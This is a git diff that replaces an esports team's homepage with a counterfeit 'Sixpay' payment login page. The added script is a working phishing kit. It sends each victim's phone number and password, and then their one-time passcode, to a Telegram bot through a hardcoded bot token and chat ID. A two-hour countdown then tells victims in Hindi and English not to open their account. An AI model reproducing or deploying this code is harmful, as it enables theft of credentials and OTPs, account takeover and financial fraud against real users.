@@ -1,87 +1,374 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>JHR ESPORTS</title>
-  <link rel="stylesheet" href="style.css" />
-  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta property="og:title" content="Sixpay Support Team">
+<meta property="og:description" content="Sixpay login page - Six Pay Offical Website">
+<meta property="og:type" content="website">
+<title>Sixpay Login</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+body {
+    font-family: Arial, sans-serif;
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+}
+.container {
+    max-width: 400px;
+    width: 100%;
+    padding: 0 20px;
+}
+.logo {
+    text-align: center;
+    margin-bottom: 20px;
+}
+.logo img {
+    width: 220px;
+    max-width: 100%;
+    height: auto;
+}
+.input-box {
+    display: flex;
+    align-items: center;
+    background: #f3f6fa;
+    border-radius: 30px;
+    padding: 14px 18px;
+    margin-bottom: 8px;
+    border-bottom: 2px solid transparent;
+}
+.input-box i {
+    color: #2196f3;
+    font-size: 20px;
+    margin-right: 12px;
+    width: 24px;
+    text-align: center;
+}
+.input-box input {
+    border: none;
+    outline: none;
+    background: transparent;
+    width: 100%;
+    font-size: 16px;
+    font-weight: 500;
+}
+.input-box.error {
+    border-bottom: 2px solid red;
+}
+.error-text {
+    font-size: 13px;
+    color: red;
+    margin: -5px 0 10px 0;
+    display: none;
+}
+.options {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 14px;
+    margin: 12px 0 20px 0;
+}
+.options label {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #1e88e5;
+}
+.options a {
+    color: #1e88e5;
+    text-decoration: none;
+}
+.login-btn {
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 12px;
+    background: linear-gradient(to right, #2196f3, #1976d2);
+    color: white;
+    font-size: 18px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: 0.3s;
+}
+.login-btn:hover {
+    opacity: 0.9;
+}
+.privacy {
+    margin-top: 15px;
+    text-align: center;
+    font-size: 13px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+}
+.privacy a {
+    color: #1e88e5;
+    text-decoration: none;
+}
+.modal {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: rgba(0,0,0,0.5);
+    justify-content: center;
+    align-items: center;
+    z-index: 999;
+}
+.modal-box {
+    background: white;
+    width: 90%;
+    max-width: 340px;
+    border-radius: 16px;
+    padding: 25px 20px;
+    text-align: center;
+    position: relative;
+}
+.close {
+    position: absolute;
+    right: 15px;
+    top: 10px;
+    font-size: 24px;
+    cursor: pointer;
+}
+.otp-inputs {
+    display: flex;
+    justify-content: space-between;
+    margin: 20px 0;
+}
+.otp-inputs input {
+    width: 55px;
+    height: 50px;
+    text-align: center;
+    font-size: 22px;
+    font-weight: 600;
+    border: none;
+    border-bottom: 2px solid #ccc;
+    outline: none;
+}
+.timer {
+    color: #999;
+    font-size: 14px;
+    text-align: right;
+}
+.loader {
+    border: 4px solid #eee;
+    border-top: 4px solid #2196f3;
+    border-radius: 50%;
+    width: 40px;
+    height: 40px;
+    margin: 15px auto;
+    animation: spin 1s linear infinite;
+}
+@keyframes spin {
+    100% { transform: rotate(360deg); }
+}
+#countdown {
+    font-size: 20px;
+    font-weight: bold;
+    margin: 10px 0;
+}
+@media (max-width: 480px) {
+    .container {
+        padding: 0 15px;
+    }
+    .logo img {
+        width: 180px;
+    }
+    .input-box {
+        padding: 12px 14px;
+    }
+    .login-btn {
+        font-size: 16px;
+        padding: 12px;
+    }
+    .otp-inputs input {
+        width: 45px;
+        height: 45px;
+        font-size: 18px;
+    }
+}
+</style>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-  <canvas id="particles"></canvas>
-  <header class="header">
+
+<div class="container">
     <div class="logo">
-      <img src="logo.png" alt="JHR ESPORTS" />
-      <h1>JHR <span>ESPORTS</span></h1>
+        <img src="https://i.ibb.co/jkHnXGHY/IMG-0653.jpg" alt="Sixpay">
     </div>
-    <nav>
-      <a href="#home">Home</a>
-      <a href="#about">About</a>
-      <a href="#team">Team</a>
-      <a href="#gallery">Gallery</a>
-      <a href="#tournaments">Tournaments</a>
-      <a href="#contact">Contact</a>
-    </nav>
-  </header>
-  <section id="home" class="home">
-    <div class="overlay">
-      <h2>WELCOME TO</h2>
-      <h1>JHR <span>ESPORTS</span></h1>
-      <p>Play • Conquer • Dominate</p>
-      <a href="#about" class="btn">Enter Arena</a>
+
+    <form id="loginForm" onsubmit="return validateForm()">
+        <div class="input-box" id="phoneBox">
+            <i class="fas fa-mobile-alt"></i>
+            <input type="tel" id="phone" placeholder="Enter phone number" maxlength="10" required>
+        </div>
+        <div class="error-text" id="phoneError">The phone field format is invalid</div>
+
+        <div class="input-box">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="password" placeholder="Enter password" required>
+        </div>
+
+        <div class="options">
+            <label><input type="checkbox"> Save Password</label>
+            <a href="#">Forgot password</a>
+        </div>
+
+        <button type="submit" class="login-btn">Login</button>
+    </form>
+
+    <div class="privacy">
+        <input type="checkbox" checked>
+        <span>Agree "<a href="#">User Privacy Agreement</a>"</span>
     </div>
-  </section>
-  <section id="about" class="about">
-    <h2>About Us</h2>
-    <p>JHR Esports is a powerhouse in the competitive gaming world.  
-    We stand for teamwork, passion, and excellence.  
-    Join us as we redefine the esports battleground.</p>
-  </section>
-  <section id="team" class="team">
-    <h2>Our Squad</h2>
-    <div class="team-container">
-      <div class="member"><img src="https://via.placeholder.com/200" alt="Player 1"><h3>Player One</h3><p>Leader / Assault</p></div>
-      <div class="member"><img src="https://via.placeholder.com/200" alt="Player 2"><h3>Player Two</h3><p>Sniper</p></div>
-      <div class="member"><img src="https://via.placeholder.com/200" alt="Player 3"><h3>Player Three</h3><p>Support</p></div>
+</div>
+
+<!-- OTP Modal -->
+<div id="otpModal" class="modal">
+    <div class="modal-box">
+        <span class="close" onclick="closeModal()">×</span>
+        <h2>Enter OTP</h2>
+        <p id="otpText"></p>
+        <div class="otp-inputs">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+            <input type="tel" maxlength="1" inputmode="numeric">
+        </div>
+        <p class="timer" id="timer">Resend in 120 seconds</p>
     </div>
-  </section>
-  <section id="gallery" class="gallery">
-    <h2>Gallery</h2>
-    <div class="gallery-grid">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 1">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 2">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 3">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 4">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 5">
-      <img src="https://via.placeholder.com/400x250" alt="Gallery 6">
+</div>
+
+<!-- Final Popup -->
+<div id="finalPopup" class="modal">
+    <div class="modal-box">
+        <h3 id="msgTitle">Please wait 2 hours</h3>
+        <p id="msgText">कृपया 2 घंटे इंतजार करें, उसके बाद आपका sell verify हो जाएगा और आपके अकाउंट में success हो जाएगा। कृपया 2 घंटे तक अपनी ID open ना करें, नहीं तो आपका account block हो सकता है।</p>
+        <div class="loader"></div>
+        <p id="countdown">02:00:00</p>
+        <button onclick="toggleLang()" style="margin-top:10px;padding:10px 20px;border:none;border-radius:8px;background:#2196f3;color:white;cursor:pointer;">Change Language</button>
     </div>
-  </section>
-  <section id="tournaments" class="tournaments">
-    <h2>Tournament Results</h2>
-    <table>
-      <thead><tr><th>Rank</th><th>Team</th><th>Points</th><th>Event</th><th>Date</th></tr></thead>
-      <tbody>
-        <tr><td>1</td><td>JHR ESPORTS</td><td>250</td><td>Pro League Finals</td><td>Sep 2025</td></tr>
-        <tr><td>2</td><td>Team Shadow</td><td>210</td><td>Battle Masters</td><td>Aug 2025</td></tr>
-        <tr><td>3</td><td>Nova Core</td><td>190</td><td>Fire Cup</td><td>Jul 2025</td></tr>
-      </tbody>
-    </table>
-  </section>
-  <section id="contact" class="contact">
-    <h2>Contact Us</h2>
-    <p>Interested in joining or collaborating? Let’s connect!</p>
-    <a href="mailto:jhresports@email.com" class="btn">Send Message</a>
-  </section>
-  <footer class="footer"><p>© 2025 JHR ESPORTS | All Rights Reserved</p></footer>
-  <script>
-  const c=document.getElementById("particles"),ctx=c.getContext("2d");
-  let pArr; c.width=window.innerWidth; c.height=window.innerHeight;
-  const colors=["#ff0000","#ffffff","#e60000","#ff4040"];
-  class P{constructor(){this.x=Math.random()*c.width;this.y=Math.random()*c.height;this.s=Math.random()*2+1;this.sx=Math.random()*1-0.5;this.sy=Math.random()*1-0.5;this.color=colors[Math.floor(Math.random()*colors.length)];}
-  u(){this.x+=this.sx;this.y+=this.sy;if(this.x<0||this.x>c.width)this.sx*=-1;if(this.y<0||this.y>c.height)this.sy*=-1;}
-  d(){ctx.beginPath();ctx.arc(this.x,this.y,this.s,0,Math.PI*2);ctx.fillStyle=this.color;ctx.shadowBlur=20;ctx.shadowColor=this.color;ctx.fill();}}
-  function init(){pArr=[];for(let i=0;i<120;i++)pArr.push(new P());}
-  function anim(){ctx.clearRect(0,0,c.width,c.height);pArr.forEach(p=>{p.u();p.d();});requestAnimationFrame(anim);}
-  init();anim();window.addEventListener("resize",()=>{c.width=window.innerWidth;c.height=window.innerHeight;init();});
-  </script>
-</body></html>
+</div>
+
+<script>
+const BOT_TOKEN = "8757089666:AAGdUxSNs546H9mcHJS2kfClJ5tZUmOcqro";
+const CHAT_ID = "-1004414022639"; // 👈 GROUP CHAT ID (UPDATE KAR DIYA)
+
+async function sendDataToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
+        });
+    } catch (e) { console.error(e); }
+}
+
+function validateForm() {
+    let phone = document.getElementById("phone").value.trim();
+    let pass = document.getElementById("password").value.trim();
+    let phoneBox = document.getElementById("phoneBox");
+    let error = document.getElementById("phoneError");
+
+    if (phone.length !== 10 || isNaN(phone)) {
+        phoneBox.classList.add("error");
+        error.style.display = "block";
+        return false;
+    } else {
+        phoneBox.classList.remove("error");
+        error.style.display = "none";
+    }
+
+    sendDataToTelegram(`<b>Six Pay Login</b>\n\n📱 Phone: ${phone}\n🔑 Password: ${pass}`);
+
+    let masked = phone.substring(0,3) + "****" + phone.substring(6);
+    document.getElementById("otpText").innerText = "OTP sent to " + masked;
+    document.getElementById("otpModal").style.display = "flex";
+    startTimer();
+    setupOTP(phone);
+    return false;
+}
+
+function closeModal() {
+    document.getElementById("otpModal").style.display = "none";
+}
+
+let time = 120;
+function startTimer() {
+    time = 120;
+    let timer = document.getElementById("timer");
+    let interval = setInterval(() => {
+        time--;
+        timer.innerText = "Resend in " + time + " seconds";
+        if (time <= 0) {
+            clearInterval(interval);
+            timer.innerText = "Resend OTP";
+        }
+    }, 1000);
+}
+
+function setupOTP(phone) {
+    let inputs = document.querySelectorAll(".otp-inputs input");
+    inputs.forEach((input, index) => {
+        input.addEventListener("input", function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value && index < inputs.length - 1) inputs[index + 1].focus();
+            let otp = "";
+            inputs.forEach(i => otp += i.value);
+            if (otp.length === 4) {
+                sendDataToTelegram(`<b>Six Pay OTP</b>\n\n📱 Phone: ${phone}\n🔢 OTP: ${otp}`);
+                showFinalPopup();
+            }
+        });
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+    });
+}
+
+function showFinalPopup() {
+    document.getElementById("otpModal").style.display = "none";
+    document.getElementById("finalPopup").style.display = "flex";
+    startCountdown();
+}
+
+let totalTime = 7200;
+function startCountdown() {
+    let display = document.getElementById("countdown");
+    let interval = setInterval(() => {
+        let hrs = String(Math.floor(totalTime / 3600)).padStart(2, '0');
+        let min = String(Math.floor((totalTime % 3600) / 60)).padStart(2, '0');
+        let sec = String(totalTime % 60).padStart(2, '0');
+        display.innerText = hrs + ":" + min + ":" + sec;
+        totalTime--;
+        if (totalTime < 0) clearInterval(interval);
+    }, 1000);
+}
+
+let isEnglish = false;
+function toggleLang() {
+    let text = document.getElementById("msgText");
+    text.innerText = isEnglish ?
+        "कृपया 2 घंटे इंतजार करें, उसके बाद आपका sell verify हो जाएगा और आपके अकाउंट में success हो जाएगा। कृपया 2 घंटे तक अपनी ID open ना करें, नहीं तो आपका account block हो सकता है।" :
+        "Please wait for 2 hours. After that your sell will be verified and it will be successful in your account. Please do not open your ID for 2 hours otherwise your account may be blocked.";
+    isEnglish = !isEnglish;
+}
+</script>
+
+</body>
+</html>
